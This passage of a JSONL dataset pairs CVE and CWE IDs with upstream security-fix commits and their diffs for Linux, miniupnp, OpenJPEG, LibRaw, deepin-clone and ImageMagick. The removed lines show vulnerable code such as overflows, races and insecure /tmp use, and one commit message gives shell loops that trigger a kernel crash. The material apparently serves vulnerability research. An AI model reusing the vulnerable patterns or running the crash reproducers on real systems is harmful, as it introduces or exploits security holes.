<torvalds@linux-foundation.org>\n---\n fs/proc/base.c | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/fs/proc/base.c b/fs/proc/base.c\nindex a7310841c831..b1f6e62773d3 100644\n--- a/fs/proc/base.c\n+++ b/fs/proc/base.c\n@@ -442,12 +442,13 @@ static const struct file_operations proc_lstats_operations = {\n unsigned long badness(struct task_struct *p, unsigned long uptime);\n static int proc_oom_score(struct task_struct *task, char *buffer)\n {\n-\tunsigned long points;\n+\tunsigned long points = 0;\n \tstruct timespec uptime;\n \n \tdo_posix_clock_monotonic_gettime(&uptime);\n \tread_lock(&tasklist_lock);\n-\tpoints = badness(task->group_leader, uptime.tv_sec);\n+\tif (pid_alive(task))\n+\t\tpoints = badness(task, uptime.tv_sec);\n \tread_unlock(&tasklist_lock);\n \treturn sprintf(buffer, \"%lu\\n\", points);\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "stoth68000", "repo": "media-tree", "source": "cve"}
{"CVE_ID": "CVE-2019-12107", "CWE_ID": "200", "category": "security", "commit_id": "bec6ccec63cadc95655721bc0e1dd49dac759d94", "commit_message": "From bec6ccec63cadc95655721bc0e1dd49dac759d94 Mon Sep 17 00:00:00 2001\nFrom: Thomas Bernard <miniupnp@free.fr>\nDate: Tue, 18 Dec 2018 22:37:14 +0100\nSubject: [PATCH] upnp_event_prepare(): check the return value of snprintf()\n\n---\n miniupnpd/upnpevents.c | 37 ++++++++++++++++++++++++++-----------\n 1 file changed, 26 insertions(+), 11 deletions(-)\n\n", "diff_code": "diff --git a/miniupnpd/upnpevents.c b/miniupnpd/upnpevents.c\nindex d96bccbe..3bc402f3 100644\n--- a/miniupnpd/upnpevents.c\n+++ b/miniupnpd/upnpevents.c\n@@ -443,19 +443,34 @@ static void upnp_event_prepare(struct upnp_event_notify * obj)\n \t\tl = 0;\n \t}\n \tobj->buffersize = 1024;\n-\tobj->buffer = malloc(obj->buffersize);\n-\tif(!obj->buffer) {\n-\t\tsyslog(LOG_ERR, \"%s: malloc returned NULL\", \"upnp_event_prepare\");\n-\t\tif(xml) {\n-\t\t\tfree(xml);\n+\tfor (;;) {\n+\t\tobj->buffer = malloc(obj->buffersize);\n+\t\tif(!obj->buffer) {\n+\t\t\tsyslog(LOG_ERR, \"%s: malloc returned NULL\", \"upnp_event_prepare\");\n+\t\t\tif(xml) {\n+\t\t\t\tfree(xml);\n+\t\t\t}\n+\t\t\tobj->state = EError;\n+\t\t\treturn;\n \t\t}\n-\t\tobj->state = EError;\n-\t\treturn;\n+\t\tobj->tosend = snprintf(obj->buffer, obj->buffersize, notifymsg,\n+\t\t                       obj->path, obj->addrstr, obj->portstr, l+2,\n+\t\t                       obj->sub->uuid, obj->sub->seq,\n+\t\t                       l, xml);\n+\t\tif (obj->tosend < 0) {\n+\t\t\tsyslog(LOG_ERR, \"%s: snprintf() failed\", \"upnp_event_prepare\");\n+\t\t\tif(xml) {\n+\t\t\t\tfree(xml);\n+\t\t\t}\n+\t\t\tobj->state = EError;\n+\t\t\treturn;\n+\t\t} else if (obj->tosend < obj->buffersize) {\n+\t\t\tbreak; /* the buffer was large enough */\n+\t\t}\n+\t\t/* Try again with a buffer big enough */\n+\t\tfree(obj->buffer);\n+\t\tobj->buffersize = obj->tosend + 1;\t/* reserve space for the final 0 */\n \t}\n-\tobj->tosend = snprintf(obj->buffer, obj->buffersize, notifymsg,\n-\t                       obj->path, obj->addrstr, obj->portstr, l+2,\n-\t                       obj->sub->uuid, obj->sub->seq,\n-\t                       l, xml);\n \tif(xml) {\n \t\tfree(xml);\n \t\txml = NULL;\n", "owner": "miniupnp", "repo": "miniupnp", "source": "cve"}
{"CVE_ID": "CVE-2017-14151", "CWE_ID": "119", "category": "security", "commit_id": "afb308b9ccbe129608c9205cf3bb39bbefad90b9", "commit_message": "From afb308b9ccbe129608c9205cf3bb39bbefad90b9 Mon Sep 17 00:00:00 2001\nFrom: Even Rouault <even.rouault@spatialys.com>\nDate: Mon, 14 Aug 2017 17:20:37 +0200\nSubject: [PATCH] Encoder: grow buffer size in\n opj_tcd_code_block_enc_allocate_data() to avoid write heap buffer overflow in\n opj_mqc_flush (#982)\n\n---\n src/lib/openjp2/tcd.c                   | 7 +++++--\n tests/nonregression/test_suite.ctest.in | 2 ++\n 2 files changed, 7 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/src/lib/openjp2/tcd.c b/src/lib/openjp2/tcd.c\nindex 301c7213e..53cdcf64d 100644\n--- a/src/lib/openjp2/tcd.c\n+++ b/src/lib/openjp2/tcd.c\n@@ -1187,8 +1187,11 @@ static OPJ_BOOL opj_tcd_code_block_enc_allocate_data(opj_tcd_cblk_enc_t *\n {\n     OPJ_UINT32 l_data_size;\n \n-    /* The +1 is needed for https://github.com/uclouvain/openjpeg/issues/835 */\n-    l_data_size = 1 + (OPJ_UINT32)((p_code_block->x1 - p_code_block->x0) *\n+    /* +1 is needed for https://github.com/uclouvain/openjpeg/issues/835 */\n+    /* and actually +2 required for https://github.com/uclouvain/openjpeg/issues/982 */\n+    /* TODO: is there a theoretical upper-bound for the compressed code */\n+    /* block size ? */\n+    l_data_size = 2 + (OPJ_UINT32)((p_code_block->x1 - p_code_block->x0) *\n                                    (p_code_block->y1 - p_code_block->y0) * (OPJ_INT32)sizeof(OPJ_UINT32));\n \n     if (l_data_size > p_code_block->data_size) {\ndiff --git a/tests/nonregression/test_suite.ctest.in b/tests/nonregression/test_suite.ctest.in\nindex aaf40d7d0..ffd964c2a 100644\n--- a/tests/nonregression/test_suite.ctest.in\n+++ b/tests/nonregression/test_suite.ctest.in\n@@ -169,6 +169,8 @@ opj_compress -i @INPUT_NR_PATH@/Bretagne2.ppm -o @TEMP_PATH@/Bretagne2_empty_ban\n # Same rate as Bretagne2_4.j2k\n opj_compress -i @INPUT_NR_PATH@/Bretagne2.ppm -o @TEMP_PATH@/Bretagne2_empty_band_r800.j2k -t 2591,1943 -n 2 -r 800\n \n+opj_compress -i @INPUT_NR_PATH@/issue982.bmp -o @TEMP_PATH@/issue982.j2k -n 1\n+\n # DECODER TEST SUITE\n opj_decompress -i  @INPUT_NR_PATH@/Bretagne2.j2k -o @TEMP_PATH@/Bretagne2.j2k.pgx\n opj_decompress -i  @INPUT_NR_PATH@/_00042.j2k -o @TEMP_PATH@/_00042.j2k.pgx\n", "owner": "uclouvain", "repo": "openjpeg", "source": "cve"}
{"CVE_ID": "CVE-2017-6889", "CWE_ID": "190", "category": "security", "commit_id": "194f592e205990ea8fce72b6c571c14350aca716", "commit_message": "From 194f592e205990ea8fce72b6c571c14350aca716 Mon Sep 17 00:00:00 2001\nFrom: Alex Tutubalin <lexa@lexa.ru>\nDate: Sat, 4 Mar 2017 19:55:24 +0300\nSubject: [PATCH] Fixed possible foveon buffer overrun (Secunia SA750000)\n\n---\n dcraw_foveon.c | 8 ++++++--\n 1 file changed, 6 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/dcraw_foveon.c b/dcraw_foveon.c\nindex d8b7005..bdde89d 100644\n--- a/dcraw_foveon.c\n+++ b/dcraw_foveon.c\n@@ -319,7 +319,7 @@ void CLASS foveon_huff (ushort *huff)\n void CLASS foveon_dp_load_raw()\n {\n   unsigned c, roff[4], row, col, diff;\n-  ushort huff[512], vpred[2][2], hpred[2];\n+  ushort huff[1024], vpred[2][2], hpred[2];\n \n   fseek (ifp, 8, SEEK_CUR);\n   foveon_huff (huff);\n@@ -346,12 +346,16 @@ void CLASS foveon_dp_load_raw()\n void CLASS foveon_load_camf()\n {\n   unsigned type, wide, high, i, j, row, col, diff;\n-  ushort huff[258], vpred[2][2] = {{512,512},{512,512}}, hpred[2];\n+  ushort huff[1024], vpred[2][2] = {{512,512},{512,512}}, hpred[2];\n \n   fseek (ifp, meta_offset, SEEK_SET);\n   type = get4();  get4();  get4();\n   wide = get4();\n   high = get4();\n+#ifdef LIBRAW_LIBRARY_BUILD\n+  if(wide>32767 || high > 32767 || wide*high > 20000000)\n+     throw LIBRAW_EXCEPTION_IO_CORRUPT;\n+#endif\n   if (type == 2) {\n     fread (meta_data, 1, meta_length, ifp);\n     for (i=0; i < meta_length; i++) {\n", "owner": "LibRaw", "repo": "LibRaw-demosaic-pack-GPL2", "source": "cve"}
{"CVE_ID": "CVE-2019-13228", "CWE_ID": "59", "category": "security", "commit_id": "e079f3e2712b4f8c28e3e63e71ba1a1f90fce1ab", "commit_message": "From e079f3e2712b4f8c28e3e63e71ba1a1f90fce1ab Mon Sep 17 00:00:00 2001\nFrom: zccrs <zccrs@live.com>\nDate: Fri, 31 May 2019 15:38:16 +0800\nSubject: [PATCH] fix: Do not use the \"/tmp\" directory\n\nhttps://github.com/linuxdeepin/deepin-clone/issues/16\nhttps://bugzilla.opensuse.org/show_bug.cgi?id=1130388\n---\n app/src/corelib/ddevicediskinfo.cpp |  4 ++--\n app/src/corelib/helper.cpp          |  8 +++++---\n app/src/corelib/helper.h            |  2 ++\n app/src/fixboot/bootdoctor.cpp      |  3 +--\n app/src/main.cpp                    | 26 +++++---------------------\n 5 files changed, 15 insertions(+), 28 deletions(-)\n\n", "diff_code": "diff --git a/app/src/corelib/ddevicediskinfo.cpp b/app/src/corelib/ddevicediskinfo.cpp\nindex d5e0e77..48a54ba 100644\n--- a/app/src/corelib/ddevicediskinfo.cpp\n+++ b/app/src/corelib/ddevicediskinfo.cpp\n@@ -303,9 +303,9 @@ bool DDeviceDiskInfoPrivate::openDataStream(int index)\n \n         if (currentMode == DDiskInfo::Read) {\n             const QString &executer = Helper::getPartcloneExecuter(part);\n-            process->start(QStringLiteral(\"%1 -s %2 -o - -c -z %3 -L /tmp/partclone.log\").arg(executer).arg(part.filePath()).arg(Global::bufferSize), QIODevice::ReadOnly);\n+            process->start(QStringLiteral(\"%1 -s %2 -o - -c -z %3 -L /var/log/partclone.log\").arg(executer).arg(part.filePath()).arg(Global::bufferSize), QIODevice::ReadOnly);\n         } else {\n-            process->start(QStringLiteral(\"partclone.restore -s - -o %2 -z %3 -L /tmp/partclone.log\").arg(part.filePath()).arg(Global::bufferSize));\n+            process->start(QStringLiteral(\"partclone.restore -s - -o %2 -z %3 -L /var/log/partclone.log\").arg(part.filePath()).arg(Global::bufferSize));\n         }\n \n         break;\ndiff --git a/app/src/corelib/helper.cpp b/app/src/corelib/helper.cpp\nindex 73e0e20..ec9f072 100644\n--- a/app/src/corelib/helper.cpp\n+++ b/app/src/corelib/helper.cpp\n@@ -100,6 +100,8 @@ int Helper::processExec(QProcess *process, const QString &command, int timeout,\n     if (process->state() != QProcess::NotRunning) {\n         dCDebug(\"The \\\"%s\\\" timeout, timeout: %d\", qPrintable(command), timeout);\n \n+        // QT Bug，某种情况下(未知) QProcess::state 返回的状态有误，导致进程已退出却未能正确获取到其当前状态\n+        // 因此,额外通过系统文件判断进程是否还存在\n         if (QFile::exists(QString(\"/proc/%1\").arg(process->pid()))) {\n             process->terminate();\n             process->waitForFinished();\n@@ -331,7 +333,7 @@ bool Helper::getPartitionSizeInfo(const QString &partDevice, qint64 *used, qint6\n \n         return true;\n     } else {\n-        process.start(QString(\"%1 -s %2 -c -q -C -L /tmp/partclone.log\").arg(getPartcloneExecuter(DDevicePartInfo(partDevice))).arg(partDevice));\n+        process.start(QString(\"%1 -s %2 -c -q -C -L /var/log/partclone.log\").arg(getPartcloneExecuter(DDevicePartInfo(partDevice))).arg(partDevice));\n         process.setStandardOutputFile(\"/dev/null\");\n         process.setReadChannel(QProcess::StandardError);\n         process.waitForStarted();\n@@ -501,9 +503,9 @@ QString Helper::temporaryMountDevice(const QString &device, const QString &name,\n         return mount_point;\n \n     mount_point = \"%1/.%2/mount/%3\";\n-    const QStringList &tmp_paths = QStandardPaths::standardLocations(QStandardPaths::TempLocation);\n+    const QStringList &tmp_paths = QStandardPaths::standardLocations(QStandardPaths::RuntimeLocation);\n \n-    mount_point = mount_point.arg(tmp_paths.isEmpty() ? \"/tmp\" : tmp_paths.first()).arg(qApp->applicationName()).arg(name);\n+    mount_point = mount_point.arg(tmp_paths.isEmpty() ? \"/run/user/0\" : tmp_paths.first()).arg(qApp->applicationName()).arg(name);\n \n     if (!QDir::current().mkpath(mount_point)) {\n         dCError(\"mkpath \\\"%s\\\" failed\", qPrintable(mount_point));\ndiff --git a/app/src/corelib/helper.h b/app/src/corelib/helper.h\nindex 19665c0..adca5a3 100644\n--- a/app/src/corelib/helper.h\n+++ b/app/src/corelib/helper.h\n@@ -99,6 +99,8 @@ class Helper : public QObject\n     static QString parseSerialUrl(const QString &urlString, QString *errorString = 0);\n     static QString toSerialUrl(const QString &file);\n \n+    static bool clearSymlink(const QString &path);\n+\n signals:\n     void newWarning(const QString &message);\n     void newError(const QString &message);\ndiff --git a/app/src/fixboot/bootdoctor.cpp b/app/src/fixboot/bootdoctor.cpp\nindex 877a979..494bb04 100644\n--- a/app/src/fixboot/bootdoctor.cpp\n+++ b/app/src/fixboot/bootdoctor.cpp\n@@ -55,8 +55,7 @@ bool BootDoctor::fix(const QString &partDevice)\n     }\n \n     {\n-        const QStringList &tmp_paths = QStandardPaths::standardLocations(QStandardPaths::TempLocation);\n-        const QString tmp_dir = (tmp_paths.isEmpty() ? \"/tmp\" : tmp_paths.first()) + \"/.deepin-clone\";\n+        const QString tmp_dir = \"/var/cache/deepin-clone\";\n \n         if (!QDir::current().mkpath(tmp_dir)) {\n             dCError(\"mkpath \\\"%s\\\" failed\", qPrintable(tmp_dir));\ndiff --git a/app/src/main.cpp b/app/src/main.cpp\nindex abccf6e..74be054 100644\n--- a/app/src/main.cpp\n+++ b/app/src/main.cpp\n@@ -102,36 +102,20 @@ int main(int argc, char *argv[])\n         ConsoleAppender *consoleAppender = new ConsoleAppender;\n         consoleAppender->setFormat(logFormat);\n \n-        RollingFileAppender *rollingFileAppender = new RollingFileAppender(\"/tmp/.deepin-clone.log\");\n+        const QString log_file(\"/var/log/deepin-clone.log\");\n+\n+        RollingFileAppender *rollingFileAppender = new RollingFileAppender(log_file);\n         rollingFileAppender->setFormat(logFormat);\n         rollingFileAppender->setLogFilesLimit(5);\n         rollingFileAppender->setDatePattern(RollingFileAppender::DailyRollover);\n \n-        logger->registerAppender(consoleAppender);\n         logger->registerAppender(rollingFileAppender);\n+        logger->registerAppender(consoleAppender);\n \n         if (qEnvironmentVariableIsSet(\"PKEXEC_UID\")) {\n             const quint32 pkexec_uid = qgetenv(\"PKEXEC_UID\").toUInt();\n-            const QDir user_home(getpwuid(pkexec_uid)->pw_dir);\n-\n-            QFile pam_file(user_home.absoluteFilePath(\".pam_environment\"));\n \n-            if (pam_file.open(QIODevice::ReadOnly)) {\n-                while (!pam_file.atEnd()) {\n-                    const QByteArray &line = pam_file.readLine().simplified();\n-\n-                    if (line.startsWith(\"QT_SCALE_FACTOR\")) {\n-                        const QByteArrayList &list = line.split('=');\n-\n-                        if (list.count() == 2) {\n-                            qputenv(\"QT_SCALE_FACTOR\", list.last());\n-                            break;\n-                        }\n-                    }\n-                }\n-\n-                pam_file.close();\n-            }\n+            DApplication::customQtThemeConfigPathByUserHome(getpwuid(pkexec_uid)->pw_dir);\n         }\n \n         DApplication::loadDXcbPlugin();\n", "owner": "linuxdeepin", "repo": "deepin-clone", "source": "cve"}
{"CVE_ID": "CVE-2014-8709", "CWE_ID": "200", "category": "security", "commit_id": "338f977f4eb441e69bb9a46eaa0ac715c931a67f", "commit_message": "From 338f977f4eb441e69bb9a46eaa0ac715c931a67f Mon Sep 17 00:00:00 2001\nFrom: Johannes Berg <johannes.berg@intel.com>\nDate: Sat, 1 Feb 2014 00:16:23 +0100\nSubject: [PATCH] mac80211: fix fragmentation code, particularly for encryption\n\nThe \"new\" fragmentation code (since my rewrite almost 5 years ago)\nerroneously sets skb->len rather than using skb_trim() to adjust\nthe length of the first fragment after copying out all the others.\nThis leaves the skb tail pointer pointing to after where the data\noriginally ended, and thus causes the encryption MIC to be written\nat that point, rather than where it belongs: immediately after the\ndata.\n\nThe impact of this is that if software encryption is done, then\n a) encryption doesn't work for the first fragment, the connection\n    becomes unusable as the first fragment will never be properly\n    verified at the receiver, the MIC is practically guaranteed to\n    be wrong\n b) we leak up to 8 bytes of plaintext (!) of the packet out into\n    the air\n\nThis is only mitigated by the fact that many devices are capable\nof doing encryption in hardware, in which case this can't happen\nas the tail pointer is irrelevant in that case. Additionally,\nfragmentation is not used very frequently and would normally have\nto be configured manually.\n\nFix this by using skb_trim() properly.\n\nCc: stable@vger.kernel.org\nFixes: 2de8e0d999b8 (\"mac80211: rewrite fragmentation\")\nReported-by: Jouni Malinen <j@w1.fi>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>\n---\n net/mac80211/tx.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/net/mac80211/tx.c b/net/mac80211/tx.c\nindex 27c990bf23202..97a02d3f7d877 100644\n--- a/net/mac80211/tx.c\n+++ b/net/mac80211/tx.c\n@@ -878,7 +878,7 @@ static int ieee80211_fragment(struct ieee80211_tx_data *tx,\n \t}\n \n \t/* adjust first fragment's length */\n-\tskb->len = hdrlen + per_fragm;\n+\tskb_trim(skb, hdrlen + per_fragm);\n \treturn 0;\n }\n \n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-6345", "CWE_ID": "20", "category": "security", "commit_id": "8b74d439e1697110c5e5c600643e823eb1dd0762", "commit_message": "From 8b74d439e1697110c5e5c600643e823eb1dd0762 Mon Sep 17 00:00:00 2001\nFrom: Eric Dumazet <edumazet@google.com>\nDate: Sun, 12 Feb 2017 14:03:52 -0800\nSubject: net/llc: avoid BUG_ON() in skb_orphan()\n\nIt seems nobody used LLC since linux-3.12.\n\nFortunately fuzzers like syzkaller still know how to run this code,\notherwise it would be no fun.\n\nSetting skb->sk without skb->destructor leads to all kinds of\nbugs, we now prefer to be very strict about it.\n\nIdeally here we would use skb_set_owner() but this helper does not exist yet,\nonly CAN seems to have a private helper for that.\n\nFixes: 376c7311bdb6 (\"net: add a temporary sanity check in skb_orphan()\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/llc/llc_conn.c | 3 +++\n net/llc/llc_sap.c  | 3 +++\n 2 files changed, 6 insertions(+)\n\n", "diff_code": "diff --git a/net/llc/llc_conn.c b/net/llc/llc_conn.c\nindex 3e821daf9dd4..8bc5a1bd2d45 100644\n--- a/net/llc/llc_conn.c\n+++ b/net/llc/llc_conn.c\n@@ -821,7 +821,10 @@ void llc_conn_handler(struct llc_sap *sap, struct sk_buff *skb)\n \t\t * another trick required to cope with how the PROCOM state\n \t\t * machine works. -acme\n \t\t */\n+\t\tskb_orphan(skb);\n+\t\tsock_hold(sk);\n \t\tskb->sk = sk;\n+\t\tskb->destructor = sock_efree;\n \t}\n \tif (!sock_owned_by_user(sk))\n \t\tllc_conn_rcv(sk, skb);\ndiff --git a/net/llc/llc_sap.c b/net/llc/llc_sap.c\nindex d0e1e804ebd7..5404d0d195cc 100644\n--- a/net/llc/llc_sap.c\n+++ b/net/llc/llc_sap.c\n@@ -290,7 +290,10 @@ static void llc_sap_rcv(struct llc_sap *sap, struct sk_buff *skb,\n \n \tev->type   = LLC_SAP_EV_TYPE_PDU;\n \tev->reason = 0;\n+\tskb_orphan(skb);\n+\tsock_hold(sk);\n \tskb->sk = sk;\n+\tskb->destructor = sock_efree;\n \tllc_sap_state_process(sap, skb);\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-18690", "CWE_ID": "19", "category": "security", "commit_id": "7b38460dc8e4eafba06c78f8e37099d3b34d473c", "commit_message": "From 7b38460dc8e4eafba06c78f8e37099d3b34d473c Mon Sep 17 00:00:00 2001\nFrom: \"Darrick J. Wong\" <darrick.wong@oracle.com>\nDate: Tue, 17 Apr 2018 19:10:15 -0700\nSubject: xfs: don't fail when converting shortform attr to long form during\n ATTR_REPLACE\n\nKanda Motohiro reported that expanding a tiny xattr into a large xattr\nfails on XFS because we remove the tiny xattr from a shortform fork and\nthen try to re-add it after converting the fork to extents format having\nnot removed the ATTR_REPLACE flag.  This fails because the attr is no\nlonger present, causing a fs shutdown.\n\nThis is derived from the patch in his bug report, but we really\nshouldn't ignore a nonzero retval from the remove call.\n\nBugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=199119\nReported-by: kanda.motohiro@gmail.com\nReviewed-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>\n---\n fs/xfs/libxfs/xfs_attr.c | 9 ++++++++-\n 1 file changed, 8 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/fs/xfs/libxfs/xfs_attr.c b/fs/xfs/libxfs/xfs_attr.c\nindex ce4a34a2751d..35a124400d60 100644\n--- a/fs/xfs/libxfs/xfs_attr.c\n+++ b/fs/xfs/libxfs/xfs_attr.c\n@@ -511,7 +511,14 @@ xfs_attr_shortform_addname(xfs_da_args_t *args)\n \t\tif (args->flags & ATTR_CREATE)\n \t\t\treturn retval;\n \t\tretval = xfs_attr_shortform_remove(args);\n-\t\tASSERT(retval == 0);\n+\t\tif (retval)\n+\t\t\treturn retval;\n+\t\t/*\n+\t\t * Since we have removed the old attr, clear ATTR_REPLACE so\n+\t\t * that the leaf format add routine won't trip over the attr\n+\t\t * not being around.\n+\t\t */\n+\t\targs->flags &= ~ATTR_REPLACE;\n \t}\n \n \tif (args->namelen >= XFS_ATTR_SF_ENTSIZE_MAX ||\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-7026", "CWE_ID": "362", "category": "security", "commit_id": "a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1", "commit_message": "From a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1 Mon Sep 17 00:00:00 2001\nFrom: Greg Thelen <gthelen@google.com>\nDate: Thu, 21 Nov 2013 14:32:00 -0800\nSubject: ipc,shm: fix shm_file deletion races\n\nWhen IPC_RMID races with other shm operations there's potential for\nuse-after-free of the shm object's associated file (shm_file).\n\nHere's the race before this patch:\n\n  TASK 1                     TASK 2\n  ------                     ------\n  shm_rmid()\n    ipc_lock_object()\n                             shmctl()\n                             shp = shm_obtain_object_check()\n\n    shm_destroy()\n      shum_unlock()\n      fput(shp->shm_file)\n                             ipc_lock_object()\n                             shmem_lock(shp->shm_file)\n                             <OOPS>\n\nThe oops is caused because shm_destroy() calls fput() after dropping the\nipc_lock.  fput() clears the file's f_inode, f_path.dentry, and\nf_path.mnt, which causes various NULL pointer references in task 2.  I\nreliably see the oops in task 2 if with shmlock, shmu\n\nThis patch fixes the races by:\n1) set shm_file=NULL in shm_destroy() while holding ipc_object_lock().\n2) modify at risk operations to check shm_file while holding\n   ipc_object_lock().\n\nExample workloads, which each trigger oops...\n\nWorkload 1:\n  while true; do\n    id=$(shmget 1 4096)\n    shm_rmid $id &\n    shmlock $id &\n    wait\n  done\n\n  The oops stack shows accessing NULL f_inode due to racing fput:\n    _raw_spin_lock\n    shmem_lock\n    SyS_shmctl\n\nWorkload 2:\n  while true; do\n    id=$(shmget 1 4096)\n    shmat $id 4096 &\n    shm_rmid $id &\n    wait\n  done\n\n  The oops stack is similar to workload 1 due to NULL f_inode:\n    touch_atime\n    shmem_mmap\n    shm_mmap\n    mmap_region\n    do_mmap_pgoff\n    do_shmat\n    SyS_shmat\n\nWorkload 3:\n  while true; do\n    id=$(shmget 1 4096)\n    shmlock $id\n    shm_rmid $id &\n    shmunlock $id &\n    wait\n  done\n\n  The oops stack shows second fput tripping on an NULL f_inode.  The\n  first fput() completed via from shm_destroy(), but a racing thread did\n  a get_file() and queued this fput():\n    locks_remove_flock\n    __fput\n    ____fput\n    task_work_run\n    do_notify_resume\n    int_signal\n\nFixes: c2c737a0461e (\"ipc,shm: shorten critical region for shmat\")\nFixes: 2caacaa82a51 (\"ipc,shm: shorten critical region for shmctl\")\nSigned-off-by: Greg Thelen <gthelen@google.com>\nCc: Davidlohr Bueso <davidlohr@hp.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: <stable@vger.kernel.org>  # 3.10.17+ 3.11.6+\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n ipc/shm.c | 28 +++++++++++++++++++++++-----\n 1 file changed, 23 insertions(+), 5 deletions(-)\n\n", "diff_code": "diff --git a/ipc/shm.c b/ipc/shm.c\nindex d69739610fd4..0bdf21c6814e 100644\n--- a/ipc/shm.c\n+++ b/ipc/shm.c\n@@ -208,15 +208,18 @@ static void shm_open(struct vm_area_struct *vma)\n  */\n static void shm_destroy(struct ipc_namespace *ns, struct shmid_kernel *shp)\n {\n+\tstruct file *shm_file;\n+\n+\tshm_file = shp->shm_file;\n+\tshp->shm_file = NULL;\n \tns->shm_tot -= (shp->shm_segsz + PAGE_SIZE - 1) >> PAGE_SHIFT;\n \tshm_rmid(ns, shp);\n \tshm_unlock(shp);\n-\tif (!is_file_hugepages(shp->shm_file))\n-\t\tshmem_lock(shp->shm_file, 0, shp->mlock_user);\n+\tif (!is_file_hugepages(shm_file))\n+\t\tshmem_lock(shm_file, 0, shp->mlock_user);\n \telse if (shp->mlock_user)\n-\t\tuser_shm_unlock(file_inode(shp->shm_file)->i_size,\n-\t\t\t\t\t\tshp->mlock_user);\n-\tfput (shp->shm_file);\n+\t\tuser_shm_unlock(file_inode(shm_file)->i_size, shp->mlock_user);\n+\tfput(shm_file);\n \tipc_rcu_putref(shp, shm_rcu_free);\n }\n \n@@ -983,6 +986,13 @@ SYSCALL_DEFINE3(shmctl, int, shmid, int, cmd, struct shmid_ds __user *, buf)\n \t\t}\n \n \t\tshm_file = shp->shm_file;\n+\n+\t\t/* check if shm_destroy() is tearing down shp */\n+\t\tif (shm_file == NULL) {\n+\t\t\terr = -EIDRM;\n+\t\t\tgoto out_unlock0;\n+\t\t}\n+\n \t\tif (is_file_hugepages(shm_file))\n \t\t\tgoto out_unlock0;\n \n@@ -1101,6 +1111,14 @@ long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr,\n \t\tgoto out_unlock;\n \n \tipc_lock_object(&shp->shm_perm);\n+\n+\t/* check if shm_destroy() is tearing down shp */\n+\tif (shp->shm_file == NULL) {\n+\t\tipc_unlock_object(&shp->shm_perm);\n+\t\terr = -EIDRM;\n+\t\tgoto out_unlock;\n+\t}\n+\n \tpath = shp->shm_file->f_path;\n \tpath_get(&path);\n \tshp->shm_nattch++;\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-7534", "CWE_ID": "125", "category": "security", "commit_id": "430403b0029b37decf216d57f810899cab2317dd", "commit_message": "From 430403b0029b37decf216d57f810899cab2317dd Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Sun, 7 Feb 2016 15:13:08 -0500\nSubject: [PATCH] https://github.com/ImageMagick/ImageMagick/issues/126\n\n---\n MagickCore/quantum-import.c | 2 +-\n MagickCore/quantum.c        | 4 +++-\n 2 files changed, 4 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/MagickCore/quantum-import.c b/MagickCore/quantum-import.c\nindex b04c82e724..a0085f3b73 100644\n--- a/MagickCore/quantum-import.c\n+++ b/MagickCore/quantum-import.c\n@@ -1421,7 +1421,7 @@ static void ImportCbYCrYQuantum(const Image *image,QuantumInfo *quantum_info,\n \n           n=0;\n           quantum=0;\n-          for (x=0; x < (ssize_t) number_pixels; x+=2)\n+          for (x=0; x < (ssize_t) number_pixels; x+=4)\n           {\n             for (i=0; i < 4; i++)\n             {\ndiff --git a/MagickCore/quantum.c b/MagickCore/quantum.c\nindex 9d8190a903..a594bb6fc2 100644\n--- a/MagickCore/quantum.c\n+++ b/MagickCore/quantum.c\n@@ -321,6 +321,9 @@ MagickExport size_t GetQuantumExtent(const Image *image,\n     case BGRAQuantum: packet_size=4; break;\n     case CMYKQuantum: packet_size=4; break;\n     case CMYKAQuantum: packet_size=5; break;\n+    case CbYCrAQuantum: packet_size=4; break;\n+    case CbYCrQuantum: packet_size=3; break;\n+    case CbYCrYQuantum: packet_size=4; break;\n     default: break;\n   }\n   extent=MagickMax(image->columns,image->rows);\n@@ -872,7 +875,6 @@ MagickExport void SetQuantumPack(QuantumInfo *quantum_info,\n   quantum_info->pack=pack;\n }\n \f\n-\f\n /*\n %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n %                                                                             %\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
